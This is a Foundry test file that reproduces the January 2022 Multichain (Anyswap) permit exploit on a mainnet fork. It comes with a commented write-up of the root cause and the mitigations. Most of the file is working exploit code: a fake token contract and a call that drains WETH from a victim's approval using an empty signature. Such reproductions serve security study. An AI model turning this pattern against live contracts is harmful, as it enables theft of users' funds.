// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../TestHarness.sol";
import {IWETH9} from "../interfaces/IWETH9.sol";

// forge test --match-contract Exploit_Multichain -vvv

/*
On Jan 19, 2022 an attacker stoken $960,000 in WETH tokens from the Multichain contract.

The attacker managed to exploit a swap function that uses permit tokens in order to bypass the signature check by
using tokens that do not implement a permit function.
Blocksec performed several whitehat hacks around this vulnerability to reduce the total value lost.

// Attack Overview
Total Lost (returned later):  308 WETH ($960,595)
Attack Tx: https://etherscan.io/tx/0xe50ed602bd916fc304d53c4fed236698b71691a95774ff0aeeb74b699c6227f7
Tenderly: https://dashboard.tenderly.co/tx/mainnet/0xe50ed602bd916fc304d53c4fed236698b71691a95774ff0aeeb74b699c6227f7/debugger?trace=0.1
Ethereum Transaction Viewer: https://tx.eth.samczsun.com/ethereum/0xe50ed602bd916fc304d53c4fed236698b71691a95774ff0aeeb74b699c6227f7

Exploited Contract: 0x6b7a87899490EcE95443e979cA9485CBE7E71522
Attacker Address: 0xfa2731d0bede684993ab1109db7ecf5bf33e8051
Victim Address: 0x3Ee505bA316879d246a8fD2b3d7eE63b51B44FAB
Attack Block: 14037237

// Key Info Sources
BlockSec: https://blocksecteam.medium.com/the-race-against-time-and-strategy-about-the-anyswap-rescue-and-things-we-have-learnt-4fe086b186ac
Writeup: https://medium.com/zengo/without-permit-multichains-exploit-explained-8417e8c1639b

Principle: Poor input validation, unchecked permit token.

https://gist.github.com/zhaojun-sh/0df8429d52ae7d71b6d1ff5e8f0050dc#file-anyswaprouterv4-sol-L245-L261

    function anySwapOutUnderlyingWithPermit(
        address from,
        address token,
        address to,
        uint amount,
        uint deadline,
        uint8 v,
        bytes32 r,
        bytes32 s,
        uint toChainID
    ) external {
        address _underlying = AnyswapV1ERC20(token).underlying();
        IERC20(_underlying).permit(from, address(this), amount, deadline, v, r, s);
        TransferHelper.safeTransferFrom(_underlying, from, token, amount);
        AnyswapV1ERC20(token).depositVault(amount, from);
        _anySwapOut(from, token, to, amount, toChainID);
    }

    function _anySwapOut(address from, address token, address to, uint amount, uint toChainID) internal {
        AnyswapV1ERC20(token).burn(from, amount);
        emit LogAnySwapOut(token, from, to, amount, cID(), toChainID);
    }

ATTACK:
The function allows arbitraty tokens to be passed as token, even non-token contract addresses. The attacker passed the exploiter contract as a token which:
- Implemented an underlying() function that returns WETH address.
- As WETH has no permit() function but a fallback that triggers deposit(), any call that triggers the fallback will success regardless the signature.
- Multichain requested ApprovalForAll while managing users tokens, so any transferFrom has the requried allowance.
- Because of this, this function transfers WETH from a user who gave ApprovalForAll to Multichain (AnySwap) before to the attacker's contract;
- Rekt call: TransferHelper.safeTransferFrom(WETH, VICTIM, address(MaliciousContract), stole_WETH);

MITIGATIONS:
1) Ensure that the tokens passed are allowed and known tokens. Don't allow arbitrary tokens. (e.g. require(isWhitelisted(token_)))
2) If arbitratry tokens are meant to be used, evaluate what should happen if wrapped with non standard interfaces.
*/
interface AnyswapV4Router {
  function anySwapOutUnderlyingWithPermit(
    address from,
    address token,
    address to,
    uint256 amount,
    uint256 deadline,
    uint8 v,
    bytes32 r,
    bytes32 s,
    uint256 toChainID
  ) external;
}

interface AnyswapV1ERC20 {
  function mint(address to, uint256 amount) external returns (bool);

  function burn(address from, uint256 amount) external returns (bool);

  function changeVault(address newVault) external returns (bool);

  function depositVault(uint256 amount, address to) external returns (uint256);

  function withdrawVault(
    address from,
    uint256 amount,
    address to
  ) external returns (uint256);

  function underlying() external view returns (address);
}

// forge test --match-contract Exploit_Multichain -vvv
contract Exploit_Multichain is TestHarness{
    address WETH_Address = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    AnyswapV4Router swapRouter  = AnyswapV4Router(0x6b7a87899490EcE95443e979cA9485CBE7E71522);
    AnyswapV1ERC20 swap20 =AnyswapV1ERC20(0x6b7a87899490EcE95443e979cA9485CBE7E71522);
    IWETH9  weth = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    address constant internal ATTACKER = 0xFA2731d0BEde684993AB1109DB7ecf5bF33E8051;
    address constant internal VICTIM = 0x3Ee505bA316879d246a8fD2b3d7eE63b51B44FAB;
    uint256 constant internal stole_WETH = 308636644758370382903;
    uint256 constant internal FUTURE_DEADLINE = 100000000000000000000;
    
    function setUp() external {
        cheat.createSelectFork("mainnet", 14037236); // We pin one block before the exploit happened.

        cheat.label(ATTACKER, "Attacker");
        cheat.label(VICTIM, "Victim");
        cheat.label(address(swapRouter), "AnyswapV4Router");
        cheat.label(address(swap20), "AnyswapV1ERC20");
        cheat.label(address(weth), "WETH");
    }

    function test_attack() external {
        cheat.startPrank(ATTACKER);
        console.log("\nBefore Attack WETH Balance");
        console.log("Victim: ",weth.balanceOf(VICTIM));
        console.log("Attacker Contract: ",weth.balanceOf(address(this)));
        console.log("Attacker EOA: ",weth.balanceOf(ATTACKER));

        //swapRouter.anySwapOutUnderlyingWithPermit(from, token, to, amount, deadline, v, r, s, toChainID);
        swapRouter.anySwapOutUnderlyingWithPermit(VICTIM, address(this), ATTACKER, stole_WETH, FUTURE_DEADLINE, 0, bytes32(0), bytes32(0), 56); // To BSC.
        console.log("\nDuring Attack WETH Balance");
        console.log("Victim: ",weth.balanceOf(VICTIM));
        console.log("Attacker Contract: ",weth.balanceOf(address(this)));
        console.log("Attacker EOA: ",weth.balanceOf(ATTACKER));
        cheat.stopPrank();
        
        // Send WETH from this contract to the attacker.
        weth.transfer(ATTACKER, weth.balanceOf(address(this)));

        console.log("\nAfter Attack WETH Balance");
        console.log("Victim: ",weth.balanceOf(VICTIM));
        console.log("Attacker Contract: ",weth.balanceOf(address(this)));
        console.log("Attacker EOA: ",weth.balanceOf(ATTACKER));
    }

    // Used to get the underlying of the token
    function underlying() external view returns (address){
        return address(weth);
        
    }

    // For _anySwapOut() that uses AnyswapV1ERC20 to wrap the token to burn it. Just return true so that call passes.
    function burn(address, uint256) external returns(bool){
        return true;
    }
    
    //The AnyswapV1ERC20() wraps the token and calls, this function.
    function depositVault(uint256 , address ) external returns (uint256){
        return 1;
    }

}